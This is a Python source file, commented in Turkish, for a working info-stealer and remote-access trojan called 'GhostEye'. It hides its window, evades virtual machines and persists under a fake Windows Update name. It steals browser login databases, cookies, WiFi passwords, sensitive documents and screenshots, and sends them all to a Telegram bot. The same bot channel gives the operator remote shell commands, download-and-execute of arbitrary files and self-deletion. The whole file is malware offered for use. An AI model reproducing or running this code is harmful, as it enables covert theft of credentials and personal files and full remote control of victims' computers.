#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import socket
import platform
import zipfile
import requests
import pyautogui
import subprocess
import ctypes
import shutil
import re
import uuid
import hashlib
import tempfile
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================================
# GELİŞTİRİLMİŞ AYARLAR
# ============================================================================
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

AUTO_RESTART_INTERVAL = 120  
TELEGRAM_RESTART_COMMAND = "1234"
STEALTH_MODE = True  # True ise konsola hiçbir şey yazmaz
SELF_DESTRUCT_SIGNAL = "XXX"  # Self-destruct komutu
UPLOAD_FOLDER = str(Path.home() / "Downloads" / "TempUpdates")  # Yükleme klasörü
SEND_COMMANDS_ON_START = True  # Başlangıçta komut listesi gönderilsin mi?

SENSITIVE_PATTERNS = {
    "Email": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
    "API Key": r"(AIza[0-9A-Za-z-_]{35}|sk-[a-zA-Z0-9]{48})",
    "Password": r"(password|passwd|sifre|pwd|auth|secret)\s*[:=]\s*['\"]?(\w+)['\"]?",
    "IP Address": r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
}

CRITICAL_KEYWORDS = [
    "sifre", "pass", "login", "hesap", "banka", "wallet", "key", "cuzdan", 
    "gizli", "kredi", "token", "auth", "credential", "config", "backup", "private"
]
FORCE_COLLECT_EXTENSIONS = ['.py', '.sql', '.db', '.sqlite', '.env', '.ssh', '.kdbx']
CONDITIONAL_EXTENSIONS = ['.txt', '.docx', '.xlsx', '.pdf', '.json', '.php', '.js']

MAX_FILE_SIZE = 10 * 1024 * 1024 # 10MB
MAX_FILES_TO_COLLECT = 500

# ============================================================================
# MODÜLLER
# ============================================================================

class GhostLogger:
    def log(self, level, msg):
        if not STEALTH_MODE:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [{level.upper()}] {msg}")

class GhostEye:
    def __init__(self):
        self.logger = GhostLogger()
        self.temp_dir = Path(os.getenv('TEMP', '/tmp'))
        self.last_update_id = 0
        self.app_name = "WindowsUpdateService"
        self.self_destruct = False
        self.initial_startup_completed = False
        
        # Upload klasörünü oluştur
        os.makedirs(UPLOAD_FOLDER, exist_ok=True)

        if self.is_vm():
            sys.exit()

        self.make_persistent()

    def is_vm(self):
        try:
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            vm_prefixes = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27"]
            for prefix in vm_prefixes:
                if mac.startswith(prefix): return True
            
            if os.path.exists("C:\\Windows\\System32\\drivers\\VBoxMouse.sys") or \
               os.path.exists("C:\\Windows\\System32\\drivers\\vm3dmp.sys"):
                return True
        except: pass
        return False

    def make_persistent(self):
        if platform.system() == "Windows":
            try:
                import winreg
                exe_path = os.path.realpath(sys.argv[0])
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, self.app_name, 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(key)
            except: pass

    def is_admin(self):
        try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except: return False

    def scan_directory(self, path):
        local_found = []
        try:
            for root, _, files in os.walk(path):
                if root.count(os.sep) - str(path).count(os.sep) > 4: continue
                for f in files:
                    fp = Path(root) / f
                    try:
                        f_size = fp.stat().st_size
                        if f_size > MAX_FILE_SIZE or f_size == 0: continue
                        should_add = False
                        f_name_lower = fp.name.lower()
                        if any(f_name_lower.endswith(ext) for ext in FORCE_COLLECT_EXTENSIONS):
                            should_add = True
                        elif any(f_name_lower.endswith(ext) for ext in CONDITIONAL_EXTENSIONS):
                            if any(k in f_name_lower for k in CRITICAL_KEYWORDS):
                                should_add = True
                            else:
                                try:
                                    with open(fp, 'r', errors='ignore') as file_content:
                                        content = file_content.read(5120)
                                        for ptrn in SENSITIVE_PATTERNS.values():
                                            if re.search(ptrn, content):
                                                should_add = True
                                                break
                                except: pass
                        if should_add:
                            local_found.append(fp)
                    except: continue
        except: pass
        return local_found

    def find_files(self):
        found = []
        target_paths = [
            Path.home() / "Desktop", Path.home() / "Documents", 
            Path.home() / "Downloads", Path.home() / "OneDrive"
        ]
        valid_paths = [p for p in target_paths if p.exists()]
        with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
            futures = {executor.submit(self.scan_directory, path): path for path in valid_paths}
            for future in as_completed(futures):
                found.extend(future.result())
                if len(found) >= MAX_FILES_TO_COLLECT: break
        return found[:MAX_FILES_TO_COLLECT]

    def capture_screen(self):
        try:
            path = self.temp_dir / f"s_{int(time.time())}.png"
            pyautogui.screenshot().save(str(path))
            return path
        except: return None

    def send_telegram_msg(self, text):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'})
        except: pass

    def send_telegram_photo(self, photo_path, caption=""):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            with open(photo_path, 'rb') as photo:
                requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, files={'photo': photo})
        except: pass

    def send_telegram_file(self, file_path, caption=""):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as doc:
                requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, files={'document': doc})
        except: pass

    def get_available_commands(self):
        """Kullanılabilir tüm komutları listele"""
        commands = [
            "🎯 *TEMEL KOMUTLAR* 🎯",
            f"• `{TELEGRAM_RESTART_COMMAND}` - Sistemi yeniden başlat",
            f"• `{SELF_DESTRUCT_SIGNAL}` - Self-destruct (kendini sil)",
            "",
            "📁 *DOSYA İŞLEMLERİ* 📁",
            "• `/screenshot` - Anlık ekran görüntüsü al",
            "• `/ls <dizin>` - Dizin içeriğini listele",
            "• `/download <dosya_yolu>` - Dosya indir",
            "• `/upload <URL>` - URL'den dosya indir ve çalıştır",
            "",
            "🔧 *SİSTEM KOMUTLARI* 🔧",
            "• `/cmd <komut>` - Komut satırı çalıştır",
            "• `/sysinfo` - Detaylı sistem bilgisi",
            "• `/wifi` - WiFi şifrelerini getir",
            "",
            "🔄 *ÇALIŞMA ARALIĞI* 🔄",
            f"• Otomatik veri toplama: {AUTO_RESTART_INTERVAL} saniye",
            f"• Maksimum dosya: {MAX_FILES_TO_COLLECT}",
            f"• Maksimum dosya boyutu: {MAX_FILE_SIZE // (1024*1024)}MB",
            ""
        ]
        
        return "\n".join(commands)

    def send_startup_info(self):
        """Başlangıçta sistem bilgisi ve komutları gönder"""
        try:
            # Sistem bilgileri
            sys_info = self.get_detailed_system_info()
            
            startup_msg = f"""
🚀 *GHOST EYE BAŞLATILDI* 🚀
            
📊 *SİSTEM BİLGİLERİ* 📊
"""
            for key, value in sys_info.items():
                startup_msg += f"• *{key}:* `{value}`\n"
            
            startup_msg += f"\n🆔 *Bot ID:* `{hashlib.md5(str(sys_info).encode()).hexdigest()[:8]}`\n"
            startup_msg += f"⏰ *Başlangıç Zamanı:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
            
            # İlk mesajı gönder
            self.send_telegram_msg(startup_msg)
            
            # 2 saniye bekle
            time.sleep(2)
            
            # Komut listesini gönder
            commands_msg = self.get_available_commands()
            self.send_telegram_msg(commands_msg)
            
            # Ek ekran görüntüsü al
            time.sleep(1)
            snap = self.capture_screen()
            if snap:
                self.send_telegram_photo(snap, "📸 Başlangıç Ekran Görüntüsü")
                snap.unlink()
                
            self.initial_startup_completed = True
            self.logger.log("INFO", "Başlangıç bilgileri gönderildi")
            
        except Exception as e:
            self.logger.log("ERROR", f"Başlangıç bilgisi gönderme hatası: {str(e)}")

    def download_and_execute(self, file_url, filename=None):
        """Dışarıdan dosya indirip çalıştırma"""
        try:
            if not filename:
                filename = file_url.split("/")[-1]
            
            file_path = os.path.join(UPLOAD_FOLDER, filename)
            
            # Dosyayı indir
            response = requests.get(file_url, stream=True)
            if response.status_code == 200:
                with open(file_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                self.send_telegram_msg(f"📥 Dosya indirildi: `{filename}`\n📍 Yol: `{file_path}`")
                
                # Çalıştırılabilirse çalıştır
                if platform.system() == "Windows":
                    if filename.endswith(('.exe', '.bat', '.cmd', '.ps1')):
                        if filename.endswith('.ps1'):
                            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', file_path], 
                                           creationflags=subprocess.CREATE_NO_WINDOW)
                        else:
                            subprocess.Popen([file_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        self.send_telegram_msg(f"🚀 Dosya çalıştırıldı: `{filename}`")
                    else:
                        os.startfile(file_path)
                else:
                    os.chmod(file_path, 0o755)
                    subprocess.Popen([file_path])
                
                return True
            return False
        except Exception as e:
            self.send_telegram_msg(f"❌ İndirme/Çalıştırma hatası: {str(e)}")
            return False

    def collect_wifi_passwords(self):
        """WiFi şifrelerini toplama"""
        wifi_data = {}
        
        if platform.system() == "Windows":
            try:
                # Windows WiFi profillerini getir
                output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], 
                                                universal_newlines=True, creationflags=subprocess.CREATE_NO_WINDOW)
                
                profiles = re.findall(r': (.*)\r', output)
                
                for profile in profiles:
                    try:
                        # Her profil için şifreyi al
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 
                                                         profile, 'key=clear'], 
                                                        universal_newlines=True, creationflags=subprocess.CREATE_NO_WINDOW)
                        
                        password_match = re.search(r'Key Content\s*: (.*)\r', results)
                        if password_match:
                            password = password_match.group(1)
                            wifi_data[profile] = password
                    except:
                        wifi_data[profile] = "Şifre alınamadı"
                
            except Exception as e:
                wifi_data["error"] = str(e)
        
        elif platform.system() == "Linux":
            try:
                # Linux için WiFi şifreleri (sudo gerektirir)
                if os.path.exists('/etc/NetworkManager/system-connections/'):
                    for file in os.listdir('/etc/NetworkManager/system-connections/'):
                        filepath = os.path.join('/etc/NetworkManager/system-connections/', file)
                        try:
                            with open(filepath, 'r') as f:
                                content = f.read()
                                ssid_match = re.search(r'ssid=(.*)', content)
                                psk_match = re.search(r'psk=(.*)', content)
                                
                                if ssid_match and psk_match:
                                    ssid = ssid_match.group(1)
                                    psk = psk_match.group(1)
                                    wifi_data[ssid] = psk
                        except:
                            pass
            except:
                pass
        
        return wifi_data

    def self_destruct_cleanup(self):
        """Kendini temizleme işlemi"""
        try:
            self.send_telegram_msg("⚠️ *SELF-DESTRUCT SEQUENCE INITIATED* ⚠️\n🔴 Sistemden temizleniyor...")
            
            # 1. Kayıt defteri girdisini sil
            if platform.system() == "Windows":
                try:
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                       r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                       0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, self.app_name)
                    winreg.CloseKey(key)
                except:
                    pass
            
            # 2. Kendi dosyasını sil
            current_file = os.path.realpath(sys.argv[0])
            
            # 3. Geçici dosyaları temizle
            for item in os.listdir(UPLOAD_FOLDER):
                try:
                    os.remove(os.path.join(UPLOAD_FOLDER, item))
                except:
                    pass
            
            # 4. Upload klasörünü sil
            try:
                shutil.rmtree(UPLOAD_FOLDER)
            except:
                pass
            
            # 5. Batch script oluşturarak kendini sil (Windows)
            if platform.system() == "Windows":
                batch_content = f"""@echo off
timeout /t 3 /nobreak >nul
del /f /q "{current_file}"
rmdir /s /q "{UPLOAD_FOLDER}"
del /f /q "%~f0"
"""
                batch_file = self.temp_dir / "cleanup.bat"
                with open(batch_file, 'w') as f:
                    f.write(batch_content)
                
                subprocess.Popen([str(batch_file)], creationflags=subprocess.CREATE_NO_WINDOW)
            
            self.send_telegram_msg("✅ *TEMİZLİK TAMAMLANDI*\n🗑️ Tüm izler silindi.")
            
            # Programı sonlandır
            sys.exit(0)
            
        except Exception as e:
            # Temizleme başarısız olsa bile çık
            sys.exit(1)

    def check_telegram_command(self):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            res = requests.get(url, params={"offset": self.last_update_id + 1, "timeout": 1}).json()
            if res.get("ok"):
                for up in res.get("result", []):
                    self.last_update_id = up["update_id"]
                    msg = up.get("message", {})
                    text = msg.get("text", "")
                    
                    if text == TELEGRAM_RESTART_COMMAND:
                        return True
                    
                    elif text == SELF_DESTRUCT_SIGNAL:
                        self.self_destruct = True
                        return True
                    
                    elif text == "/screenshot":
                        snap = self.capture_screen()
                        if snap:
                            self.send_telegram_photo(snap, f"📸 Anlık Ekran: {platform.node()}")
                            snap.unlink()

                    elif text.startswith("/cmd "):
                        cmd = text.replace("/cmd ", "")
                        try:
                            output = subprocess.getoutput(cmd)
                            if len(output) > 4000: output = output[:4000] + "..."
                            self.send_telegram_msg(f"💻 *CMD:* `{cmd}`\n\n`{output}`")
                        except Exception as e:
                            self.send_telegram_msg(f"⚠️ Hata: {str(e)}")

                    elif text.startswith("/ls "):
                        path_to_ls = text.replace("/ls ", "").strip()
                        try:
                            files = os.listdir(path_to_ls)
                            file_list = "\n".join([f"📁 {f}" if os.path.isdir(os.path.join(path_to_ls, f)) else f"📄 {f}" for f in files])
                            response = f"📂 *Dizin:* `{path_to_ls}`\n\n{file_list}"
                            if len(response) > 4000: response = response[:4000] + "\n..."
                            self.send_telegram_msg(response)
                        except Exception as e:
                            self.send_telegram_msg(f"⚠️ Dizin okuma hatası: {str(e)}")

                    elif text.startswith("/download "):
                        file_to_dl = text.replace("/download ", "").strip()
                        file_path = Path(file_to_dl)
                        if file_path.exists() and file_path.is_file():
                            self.send_telegram_msg(f"⏳ Dosya gönderiliyor: `{file_path.name}`")
                            self.send_telegram_file(file_path, f"📤 Talep Edilen Dosya: `{file_path.name}`")
                        else:
                            self.send_telegram_msg(f"⚠️ Dosya bulunamadı veya bir dizin: `{file_to_dl}`")
                    
                    # --- YENİ EKLENEN KOMUTLAR ---
                    elif text.startswith("/upload "):
                        file_url = text.replace("/upload ", "").strip()
                        self.send_telegram_msg(f"⏳ Dosya indiriliyor: `{file_url}`")
                        if self.download_and_execute(file_url):
                            self.send_telegram_msg("✅ Dosya başarıyla indirildi ve çalıştırıldı")
                        else:
                            self.send_telegram_msg("❌ Dosya indirilemedi")
                    
                    elif text == "/wifi":
                        self.send_telegram_msg("📡 WiFi şifreleri toplanıyor...")
                        wifi_data = self.collect_wifi_passwords()
                        
                        if wifi_data:
                            wifi_report = "📶 *WİFİ ŞİFRELERİ*\n\n"
                            for ssid, password in wifi_data.items():
                                wifi_report += f"• **{ssid}**: `{password}`\n"
                            
                            if len(wifi_report) > 4000:
                                # Büyükse dosya olarak gönder
                                wifi_file = self.temp_dir / f"wifi_passwords_{int(time.time())}.txt"
                                with open(wifi_file, 'w', encoding='utf-8') as f:
                                    json.dump(wifi_data, f, indent=4, ensure_ascii=False)
                                self.send_telegram_file(wifi_file, "📶 Toplanan WiFi Şifreleri")
                                wifi_file.unlink()
                            else:
                                self.send_telegram_msg(wifi_report)
                        else:
                            self.send_telegram_msg("⚠️ WiFi şifresi bulunamadı")
                    
                    elif text == "/sysinfo":
                        sys_info = self.get_detailed_system_info()
                        info_msg = "🖥️ *DETAYLI SİSTEM BİLGİSİ*\n\n"
                        for key, value in sys_info.items():
                            info_msg += f"• **{key}**: `{value}`\n"
                        self.send_telegram_msg(info_msg)
                    
                    elif text == "/help" or text == "/commands":
                        # Komut listesini gönder
                        commands_msg = self.get_available_commands()
                        self.send_telegram_msg(commands_msg)
                    # ----------------------------

        except: pass
        return False

    def get_detailed_system_info(self):
        """Detaylı sistem bilgisi"""
        info = {
            "Kullanıcı": os.getlogin(),
            "Bilgisayar Adı": platform.node(),
            "İşletim Sistemi": platform.platform(),
            "İşlemci": platform.processor(),
            "Python Versiyon": platform.python_version(),
            "Yönetici": "Evet" if self.is_admin() else "Hayır",
            "Çalışma Zamanı": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "IP Adresi": socket.gethostbyname(socket.gethostname())
        }
        return info

    def collect_browser_data(self):
        
        collected_dbs = []
        browser_paths = {
            "Chrome": Path.home() / "AppData/Local/Google/Chrome/User Data/Default",
            "Edge": Path.home() / "AppData/Local/Microsoft/Edge/User Data/Default"
        }
        targets = ["Login Data", "Web Data", "History", "Cookies"]
        for browser, path in browser_paths.items():
            if not path.exists(): continue
            for target in targets:
                original_file = path / target
                if original_file.exists():
                    try:
                        temp_target = self.temp_dir / f"{browser}_{target.replace(' ', '_')}"
                        shutil.copy2(original_file, temp_target)
                        collected_dbs.append(temp_target)
                    except: pass
        return collected_dbs

    def run_cycle(self):
        # Self-destruct kontrolü
        if self.self_destruct:
            self.self_destruct_cleanup()
        
        sys_info = {
            "user": os.getlogin(),
            "node": platform.node(),
            "os": platform.platform(),
            "admin": self.is_admin(),
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        files = self.find_files()
        browser_files = self.collect_browser_data()
        snap = self.capture_screen()
        zip_name = f"Ghost_{sys_info['user']}_{int(time.time())}.zip"
        zip_path = self.temp_dir / zip_name
        
        # WiFi şifrelerini de ekle
        wifi_data = self.collect_wifi_passwords()
        
        with zipfile.ZipFile(zip_path, 'w') as z:
            z.writestr("info.json", json.dumps(sys_info, indent=4))
            if wifi_data:
                z.writestr("wifi_passwords.json", json.dumps(wifi_data, indent=4))
            if snap: z.write(snap, "initial_screen.png")
            for f in files:
                try: z.write(f, f"files/{f.name}")
                except: continue
            for bf in browser_files:
                try: z.write(bf, f"browsers/{bf.name}")
                except: continue
        
        caption = f"""🚨 *GHOST EYE REPORT*
👤 *User:* `{sys_info['user']}`
📂 *Files:* {len(files)}
🌐 *Browser DBs:* {len(browser_files)}
📶 *WiFi Networks:* {len(wifi_data) if wifi_data else 0}"""
        
        try:
            with open(zip_path, 'rb') as doc:
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument", 
                              data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'Markdown'}, 
                              files={'document': doc})
        except: pass
        
        if zip_path.exists(): zip_path.unlink()
        if snap and snap.exists(): snap.unlink()
        for bf in browser_files:
            try: os.remove(bf)
            except: pass

    def start(self):
        # Başlangıçta bilgi gönder
        if SEND_COMMANDS_ON_START and not self.initial_startup_completed:
            self.send_startup_info()
        
        while True:
            try:
                self.run_cycle()
            except: pass
            
            wait_limit = time.time()
            while time.time() - wait_limit < AUTO_RESTART_INTERVAL:
                if self.check_telegram_command():
                    break
                time.sleep(2)

if __name__ == "__main__":
    if platform.system() == "Windows" and STEALTH_MODE:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    GhostEye().start()